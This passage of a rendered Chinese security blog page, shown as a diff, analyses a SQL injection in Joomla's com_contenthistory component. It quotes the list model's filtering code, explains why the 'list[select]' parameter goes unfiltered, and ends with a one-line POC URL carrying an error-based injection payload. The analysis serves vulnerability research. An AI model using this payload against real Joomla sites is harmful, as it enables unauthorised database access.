+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>								<span class="nv">$fullDirection</span> <span class="o">=</span> <span class="nx">end</span><span class="p">(</span><span class="nv">$orderingParts</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">								<span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nx">strtoupper</span><span class="p">(</span><span class="nv">$fullDirection</span><span class="p">),</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;ASC&#39;</span><span class="p">,</span> <span class="s1">&#39;DESC&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">								<span class="p">{</span>
+</span></span><span class="line"><span class="cl">									<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setState</span><span class="p">(</span><span class="s1">&#39;list.direction&#39;</span><span class="p">,</span> <span class="nv">$fullDirection</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">								<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">								<span class="nx">unset</span><span class="p">(</span><span class="nv">$orderingParts</span><span class="p">[</span><span class="nx">count</span><span class="p">(</span><span class="nv">$orderingParts</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">								<span class="c1">// The rest will be the ordering
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>								<span class="nv">$fullOrdering</span> <span class="o">=</span> <span class="nx">implode</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="nv">$orderingParts</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">								<span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$fullOrdering</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filter_fields</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">								<span class="p">{</span>
+</span></span><span class="line"><span class="cl">									<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setState</span><span class="p">(</span><span class="s1">&#39;list.ordering&#39;</span><span class="p">,</span> <span class="nv">$fullOrdering</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">								<span class="p">}</span>
+</span></span><span class="line"><span class="cl">							<span class="p">}</span>
+</span></span><span class="line"><span class="cl">							<span class="k">else</span>
+</span></span><span class="line"><span class="cl">							<span class="p">{</span>
+</span></span><span class="line"><span class="cl">								<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setState</span><span class="p">(</span><span class="s1">&#39;list.ordering&#39;</span><span class="p">,</span> <span class="nv">$ordering</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">								<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setState</span><span class="p">(</span><span class="s1">&#39;list.direction&#39;</span><span class="p">,</span> <span class="nv">$direction</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">							<span class="p">}</span>
+</span></span><span class="line"><span class="cl">							<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">						<span class="k">case</span> <span class="s1">&#39;ordering&#39;</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">							<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$value</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filter_fields</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">							<span class="p">{</span>
+</span></span><span class="line"><span class="cl">								<span class="nv">$value</span> <span class="o">=</span> <span class="nv">$ordering</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">							<span class="p">}</span>
+</span></span><span class="line"><span class="cl">							<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">						<span class="k">case</span> <span class="s1">&#39;direction&#39;</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">							<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nx">strtoupper</span><span class="p">(</span><span class="nv">$value</span><span class="p">),</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;ASC&#39;</span><span class="p">,</span> <span class="s1">&#39;DESC&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">							<span class="p">{</span>
+</span></span><span class="line"><span class="cl">								<span class="nv">$value</span> <span class="o">=</span> <span class="nv">$direction</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">							<span class="p">}</span>
+</span></span><span class="line"><span class="cl">							<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">						<span class="k">case</span> <span class="s1">&#39;limit&#39;</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">							<span class="nv">$limit</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">							<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">						<span class="c1">// Just to keep the default case
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>						<span class="k">default</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">							<span class="nv">$value</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">							<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">					<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">					<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setState</span><span class="p">(</span><span class="s1">&#39;list.&#39;</span> <span class="o">.</span> <span class="nv">$name</span><span class="p">,</span> <span class="nv">$value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">				<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="k">else</span>
+</span></span><span class="line"><span class="cl">			<span class="c1">// Keep B/C for components previous to jform forms for filters
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="c1">// Pre-fill the limits
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>				<span class="nv">$limit</span> <span class="o">=</span> <span class="nv">$app</span><span class="o">-&gt;</span><span class="na">getUserStateFromRequest</span><span class="p">(</span><span class="s1">&#39;global.list.limit&#39;</span><span class="p">,</span> <span class="s1">&#39;limit&#39;</span><span class="p">,</span> <span class="nv">$app</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;list_limit&#39;</span><span class="p">),</span> <span class="s1">&#39;uint&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">				<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setState</span><span class="p">(</span><span class="s1">&#39;list.limit&#39;</span><span class="p">,</span> <span class="nv">$limit</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">				<span class="c1">// Check if the ordering field is in the white list, otherwise use the incoming value.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>				<span class="nv">$value</span> <span class="o">=</span> <span class="nv">$app</span><span class="o">-&gt;</span><span class="na">getUserStateFromRequest</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">context</span> <span class="o">.</span> <span class="s1">&#39;.ordercol&#39;</span><span class="p">,</span> <span class="s1">&#39;filter_order&#39;</span><span class="p">,</span> <span class="nv">$ordering</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">				<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$value</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filter_fields</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">				<span class="p">{</span>
+</span></span><span class="line"><span class="cl">					<span class="nv">$value</span> <span class="o">=</span> <span class="nv">$ordering</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">					<span class="nv">$app</span><span class="o">-&gt;</span><span class="na">setUserState</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">context</span> <span class="o">.</span> <span class="s1">&#39;.ordercol&#39;</span><span class="p">,</span> <span class="nv">$value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">				<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">				<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setState</span><span class="p">(</span><span class="s1">&#39;list.ordering&#39;</span><span class="p">,</span> <span class="nv">$value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">				<span class="c1">// Check if the ordering direction is valid, otherwise use the incoming value.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>				<span class="nv">$value</span> <span class="o">=</span> <span class="nv">$app</span><span class="o">-&gt;</span><span class="na">getUserStateFromRequest</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">context</span> <span class="o">.</span> <span class="s1">&#39;.orderdirn&#39;</span><span class="p">,</span> <span class="s1">&#39;filter_order_Dir&#39;</span><span class="p">,</span> <span class="nv">$direction</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">				<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nx">strtoupper</span><span class="p">(</span><span class="nv">$value</span><span class="p">),</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;ASC&#39;</span><span class="p">,</span> <span class="s1">&#39;DESC&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">				<span class="p">{</span>
+</span></span><span class="line"><span class="cl">					<span class="nv">$value</span> <span class="o">=</span> <span class="nv">$direction</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">					<span class="nv">$app</span><span class="o">-&gt;</span><span class="na">setUserState</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">context</span> <span class="o">.</span> <span class="s1">&#39;.orderdirn&#39;</span><span class="p">,</span> <span class="nv">$value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">				<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">				<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setState</span><span class="p">(</span><span class="s1">&#39;list.direction&#39;</span><span class="p">,</span> <span class="nv">$value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">			<span class="c1">// Support old ordering field
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="nv">$oldOrdering</span> <span class="o">=</span> <span class="nv">$app</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;filter_order&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$oldOrdering</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">in_array</span><span class="p">(</span><span class="nv">$oldOrdering</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filter_fields</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">			<span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setState</span><span class="p">(</span><span class="s1">&#39;list.ordering&#39;</span><span class="p">,</span> <span class="nv">$oldOrdering</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">			<span class="c1">// Support old direction field
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="nv">$oldDirection</span> <span class="o">=</span> <span class="nv">$app</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;filter_order_Dir&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$oldDirection</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">in_array</span><span class="p">(</span><span class="nx">strtoupper</span><span class="p">(</span><span class="nv">$oldDirection</span><span class="p">),</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;ASC&#39;</span><span class="p">,</span> <span class="s1">&#39;DESC&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">			<span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setState</span><span class="p">(</span><span class="s1">&#39;list.direction&#39;</span><span class="p">,</span> <span class="nv">$oldDirection</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">			<span class="nv">$value</span> <span class="o">=</span> <span class="nv">$app</span><span class="o">-&gt;</span><span class="na">getUserStateFromRequest</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">context</span> <span class="o">.</span> <span class="s1">&#39;.limitstart&#39;</span><span class="p">,</span> <span class="s1">&#39;limitstart&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$limitstart</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$limit</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">?</span> <span class="p">(</span><span class="nx">floor</span><span class="p">(</span><span class="nv">$value</span> <span class="o">/</span> <span class="nv">$limit</span><span class="p">)</span> <span class="o">*</span> <span class="nv">$limit</span><span class="p">)</span> <span class="o">:</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setState</span><span class="p">(</span><span class="s1">&#39;list.start&#39;</span><span class="p">,</span> <span class="nv">$limitstart</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="k">else</span>
+</span></span><span class="line"><span class="cl">		<span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setState</span><span class="p">(</span><span class="s1">&#39;list.start&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setState</span><span class="p">(</span><span class="s1">&#39;list.limit&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在这一部分代码中：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="nv">$list</span> <span class="o">=</span> <span class="nv">$app</span><span class="o">-&gt;</span><span class="na">getUserStateFromRequest</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">context</span> <span class="o">.</span> <span class="s1">&#39;.list&#39;</span><span class="p">,</span> <span class="s1">&#39;list&#39;</span><span class="p">,</span> <span class="k">array</span><span class="p">(),</span> <span class="s1">&#39;array&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">			<span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="k">foreach</span> <span class="p">(</span><span class="nv">$list</span> <span class="k">as</span> <span class="nv">$name</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">				<span class="p">{</span>
+</span></span><span class="line"><span class="cl">					<span class="c1">// Extra validations
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>					<span class="k">switch</span> <span class="p">(</span><span class="nv">$name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">					<span class="p">{</span>
+</span></span><span class="line"><span class="cl">						<span class="k">case</span> <span class="s1">&#39;fullordering&#39;</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">							<span class="nv">$orderingParts</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="nv">$value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">							<span class="k">if</span> <span class="p">(</span><span class="nx">count</span><span class="p">(</span><span class="nv">$orderingParts</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">							<span class="p">{</span>
+</span></span><span class="line"><span class="cl">								<span class="c1">// Latest part will be considered the direction
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>								<span class="nv">$fullDirection</span> <span class="o">=</span> <span class="nx">end</span><span class="p">(</span><span class="nv">$orderingParts</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">								<span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nx">strtoupper</span><span class="p">(</span><span class="nv">$fullDirection</span><span class="p">),</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;ASC&#39;</span><span class="p">,</span> <span class="s1">&#39;DESC&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">								<span class="p">{</span>
+</span></span><span class="line"><span class="cl">									<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setState</span><span class="p">(</span><span class="s1">&#39;list.direction&#39;</span><span class="p">,</span> <span class="nv">$fullDirection</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">								<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">								<span class="nx">unset</span><span class="p">(</span><span class="nv">$orderingParts</span><span class="p">[</span><span class="nx">count</span><span class="p">(</span><span class="nv">$orderingParts</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">								<span class="c1">// The rest will be the ordering
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>								<span class="nv">$fullOrdering</span> <span class="o">=</span> <span class="nx">implode</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="nv">$orderingParts</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">								<span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$fullOrdering</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filter_fields</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">								<span class="p">{</span>
+</span></span><span class="line"><span class="cl">									<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setState</span><span class="p">(</span><span class="s1">&#39;list.ordering&#39;</span><span class="p">,</span> <span class="nv">$fullOrdering</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">								<span class="p">}</span>
+</span></span><span class="line"><span class="cl">							<span class="p">}</span>
+</span></span><span class="line"><span class="cl">							<span class="k">else</span>
+</span></span><span class="line"><span class="cl">							<span class="p">{</span>
+</span></span><span class="line"><span class="cl">								<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setState</span><span class="p">(</span><span class="s1">&#39;list.ordering&#39;</span><span class="p">,</span> <span class="nv">$ordering</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">								<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setState</span><span class="p">(</span><span class="s1">&#39;list.direction&#39;</span><span class="p">,</span> <span class="nv">$direction</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">							<span class="p">}</span>
+</span></span><span class="line"><span class="cl">							<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">						<span class="k">case</span> <span class="s1">&#39;ordering&#39;</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">							<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$value</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filter_fields</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">							<span class="p">{</span>
+</span></span><span class="line"><span class="cl">								<span class="nv">$value</span> <span class="o">=</span> <span class="nv">$ordering</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">							<span class="p">}</span>
+</span></span><span class="line"><span class="cl">							<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">						<span class="k">case</span> <span class="s1">&#39;direction&#39;</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">							<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nx">strtoupper</span><span class="p">(</span><span class="nv">$value</span><span class="p">),</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;ASC&#39;</span><span class="p">,</span> <span class="s1">&#39;DESC&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">							<span class="p">{</span>
+</span></span><span class="line"><span class="cl">								<span class="nv">$value</span> <span class="o">=</span> <span class="nv">$direction</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">							<span class="p">}</span>
+</span></span><span class="line"><span class="cl">							<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">						<span class="k">case</span> <span class="s1">&#39;limit&#39;</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">							<span class="nv">$limit</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">							<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">						<span class="c1">// Just to keep the default case
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>						<span class="k">default</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">							<span class="nv">$value</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">							<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">					<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">					<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setState</span><span class="p">(</span><span class="s1">&#39;list.&#39;</span> <span class="o">.</span> <span class="nv">$name</span><span class="p">,</span> <span class="nv">$value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">				<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里会从http请求中获取名为list的数组，可以看到最开始我们的参数&rsquo;list.select&rsquo;没有对应的处理逻辑，就会走default即不做任何处理，这导致了后续子类的populateState在对model的属性进行赋值的时候没有任何的过滤。所以我们可以控制$this-&gt;getState(‘list.select’)的返回值，构造SQL注入。</p>
+<p>POC：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">/</span><span class="nx">index</span><span class="o">.</span><span class="nx">php</span><span class="o">?</span><span class="nx">option</span><span class="o">=</span><span class="nx">com_contenthistory</span><span class="o">&amp;</span><span class="nx">view</span><span class="o">=</span><span class="nx">history</span><span class="o">&amp;</span><span class="nx">item_id</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="k">list</span><span class="p">[</span><span class="nx">ordering</span><span class="p">]</span><span class="o">=&amp;</span><span class="nx">type_id</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="k">list</span><span class="p">[</span><span class="nx">select</span><span class="p">]</span><span class="o">=</span><span class="p">(</span><span class="nx">exp</span><span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="nx">select</span> <span class="o">*</span> <span class="nx">from</span><span class="p">(</span><span class="nx">select</span> <span class="nx">md5</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span><span class="nx">x</span><span class="p">)))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>多一个<code>list[ordering]=</code>是为了把原SQL中的order by字段值清空，否则会报Unknown column ‘Array’的错。</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/zerologon-%E7%BB%83%E4%B9%A0/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">ZeroLogon 练习</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://www.ddosi.org/wp-content/uploads/2022/02/24.webp" loading="lazy" data-key="" data-hash="https://www.ddosi.org/wp-content/uploads/2022/02/24.webp"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">渗透攻击学习</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2024 - 
+        
+        2026 Oight
+    </section>
+    
+    <section class="powerby">
+        
+            Build by Oight <br/>
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
